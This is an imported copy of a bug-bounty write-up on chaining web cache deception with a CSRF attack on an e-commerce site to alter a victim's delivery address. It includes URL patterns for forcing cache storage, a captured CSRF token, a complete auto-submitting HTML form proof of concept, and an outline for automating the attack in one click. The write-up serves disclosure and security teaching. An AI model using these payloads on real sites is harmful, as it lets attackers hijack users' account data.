---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-10-25_a-web-cache-deception-chained-to-a-csrf-the-recipe.md
original_filename: 2023-10-25_a-web-cache-deception-chained-to-a-csrf-the-recipe.md
title: A web cache deception chained to a CSRF, the recipe
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: f70039cf388bdce83551728b713fecd8e611c3f1c004f46996c8104a117325aa
text_sha256: dd5c02c6dddc3d7db42b2400ca4ae13f1c4b7f7a7c16419f1ec4272dc3e5d0fe
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# A web cache deception chained to a CSRF, the recipe

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-10-25_a-web-cache-deception-chained-to-a-csrf-the-recipe.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `f70039cf388bdce83551728b713fecd8e611c3f1c004f46996c8104a117325aa`
- Text SHA256: `dd5c02c6dddc3d7db42b2400ca4ae13f1c4b7f7a7c16419f1ec4272dc3e5d0fe`


## Content

---
title: "A web cache deception chained to a CSRF, the recipe"
url: "https://infosecwriteups.com/a-web-cache-deception-chained-to-a-csrf-the-recipe-9e9a5b5f53aa"
authors: ["Rachid.A (@zhero___)"]
bugs: ["Web cache deception", "CSRF"]
publication_date: "2023-10-25"
added_date: "2023-12-27"
source: "pentester.land/writeups.json"
original_index: 699
scraped_via: "browseros"
---

# A web cache deception chained to a CSRF, the recipe

Top highlight

A web cache deception chained to a CSRF, the recipe
Rachid.A
Follow
6 min read
·
Oct 25, 2023

306

3

Press enter or click to view image in full size
source: somewhere on x

Recently, I received a bounty for a vulnerability discovered on an e-commerce site allowing the personal information — including the delivery address — of a user to be changed. Let’s talk about it!

Having already explained the basic functioning of a web cache in my last article DOS via cache poisoning, I will skip this part and invite you to take a look if you have not already done so.

Web Cache Deception

As you can imagine, not all responses returned by a web server are intended to be cached, in which case the personal information of a connected user could be — potentially — accessible by anyone and for a more or less long duration depending on the cache configuration, which is obviously not a desired and/or expected behavior.

Most often, it is static resources such as images, css/js files, or even fonts that are configured to be cached. By their nature, these files do not change, saving them in the cache therefore optimizes performance and avoids unnecessary strain on the web server.

A web cache deception most of the time consists of “forcing” the caching of responses that were initially not intended to be cached in order to access them subsequently and recover the victim’s sensitive information. It is nevertheless possible that certain sensitive data is cached — without manipulation by the attacker — due to poor configuration.

Force caching a response

There are several techniques to force the caching of a response, as explained previously, static resources are often configured to be saved in the cache: if the extensions of these files (css, js, png, etc.) are filtered by the cache in order to “adapt” its behavior (saving the response or not), adding these extensions following a URL containing sensitive information can result in a web cache deception.

Some examples (non-exhaustive list) :

https://example.com/private_info.js?cachebuster=1
https://example.com/private_info/.css?cachebuster=1
https://example.com/private_info/;.png?cachebuster=1

[*] Adding the character “ ; “ before the extension is often very useful: it allows -sometimes- to return a 200 when the simple addition of an extension returns a 404 error. I should nevertheless point out that caching a 404 page is not without everything impact, it happens that the personal information of the connected user is still present on the page, so be careful.

Exploit

Once the attack vector has been found, simply send the link containing its cache-buster(*) to the victim. When he clicks on the link, his personal information — the nature of which will depend on the web app — will be accessible to the attacker via this same link.

(*)The addition of a “personalized” URL parameter serving as a cache buster is therefore essential, the data cached when the victim clicks will only be accessible via the link containing the URL parameter. The cache buster therefore serves here as a “key” to access the victim’s information.

Press enter or click to view image in full size
source: somewhere on x
Real case with my find

After receiving a notification from the program in question informing me of the implementation of new features, I decided to take a look. After a few minutes of searching, the response from a POST request caught my attention:

HTTP/2 200 OK
Accept-Ch: Sec-CH-UA,Sec-CH-UA-Mobile,Sec-CH-UA-Platform,Sec-CH-UA-Arch,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Model,Sec-CH-Device-Memory
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
Content-Type: text/html; charset=utf-8
Date: Tue, 24 Oct 2023 18:57:57 GMT
Referrer-Policy: no-referrer-when-downgrade
Vary: Accept-Encoding

{"token":"b1a437c8d5d36fc6cd189e3aa849798e"}

The token returned here serves as a CSRF token, so I think it would be interesting to obtain a cache deception, this would allow any CSRF attack -as far as possible- to be carried out on the site.

Get Rachid.A’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I decided to change the request verb by switching from POST to GET and adding an extension -preceded by the character “ ; “- as well as my cache-buster following the URL:

/;.js?cache-buster=zhero_

And there, surprise, the “cacheable” value appears in the response headers. I open another browser in Incognito mode to have confirmation, I access the previously crafted URL, and.. it works, the CSRF token of the victim account is there, kindly returned by the cache.

source: somewhere on x
Next step, CSRF attack

The CSRF attack being particularly simple and popular, I will assume that it is known to everyone (in which case do not hesitate to take a look at PortSwigger).

The CSRF token is now accessible after a click from the victim, all that remains is to identify an action with a significant impact that can be carried out in the name of the victim and to mount a CSRF attack. Like any self-respecting attacker, account takeover remains the initial objective in this case. For this, two features to check:

- Password change (very unlikely) -> not possible because the current password was requested
- Change of email address -> not possible because the current password was requested (which is not always the case)

The account takeover being — unfortunately — excluded, and have not identified any XSS on the vectors in question, the most interesting information to modify for a proof of concept was the delivery address. In the context of e-commerce, altering this information can be problematic for the victim who is not attentive.

To do this, nothing could be simpler; a small HTML template containing a form as well as the value of the CSRF token in the input provided for this purpose:

<html>
  <form id="csrf" enctype="application/x-www-form-urlencoded" method="POST" action="https://www.nope.com/nope">
  <table>
  <tr><td>firstname</td><td><input type="text" value="zhero" name="firstname"></td></tr>
  <tr><td>lastname</td><td><input type="text" value="powned" name="lastname"></td></tr>
  <tr><td>address1</td><td><input type="text" value="8 rue test" name="address1"></td></tr>
  <tr><td>address2</td><td><input type="text" value="test" name="address2"></td></tr>
  <tr><td>postcode</td><td><input type="text" value="44000" name="postcode"></td></tr>
  <tr><td>city</td><td><input type="text" value="Nantes" name="city"></td></tr>
  <tr><td>id_country</td><td><input type="text" value="10" name="id_country"></td></tr>
  <tr><td>id_state</td><td><input type="text" value="124" name="id_state"></td></tr>
  <tr><td>phone_mobile</td><td><input type="text" value="2342342342" name="phone_mobile"></td></tr>
  <tr><td>alias</td><td><input type="text" value="sdfsdfsdfsdf" name="alias"></td></tr>
  <tr><td>token</td><td><input type="text" value="b1a437c8d5d36fc6cd189e3aa849798e" name="token"></td></tr>
  <tr><td>submitAddress</td><td><input type="text" value="" name="submitAddress"></td></tr>
  </table>
  </form>
  <script>
  document.getElementById('csrf').submit()
  </script>
</html>

NB: If any of these fields were vulnerable to XSS attacks, it would have been possible to obtain a Stored XSS (from which it might have been possible to obtain an Account Takeover).

Whether the tests are carried out locally or by hosting the HTML code above, simply send the link pointing to the code (HTML page) to the victim. Its information will be changed in one click.

The complete attack — web cache deception included — will require two clicks from the victim, which is “a lot” compared to the impact of this vulnerability but it is possible to do better.

For testing purposes, I wanted not to overcomplicate the POC, but it is nevertheless possible to automate the process in order to carry out the attack in a single click: via a small web app serving as an exploit, by monitoring the victim’s click on the link (WCD), then by automatically retrieving -on this same link- the value of the token (via a simple regex) and including the value retrieved in the POST request in order to launch the CSRF attack.

In my case, this vulnerability was accepted with a Medium severity. But the same vulnerability in a different case (leading to an ATO for example) could have benefited from a more generous CVSS score, as you know, only the impact matters.

Press enter or click to view image in full size
source: somewhere on x

Thank you for reading me, if you have any questions do not hesitate to let me know. Happy hunting 🏹

X account : https://twitter.com/zhero___
Linkedin account : https://www.linkedin.com/in/rachid-allam-65477718a/

Take a look at my previous write-up titled : DOS via cache poisoning

https://medium.com/bugbountywriteup/dos-via-cache-poisoning-38f3a87f997c
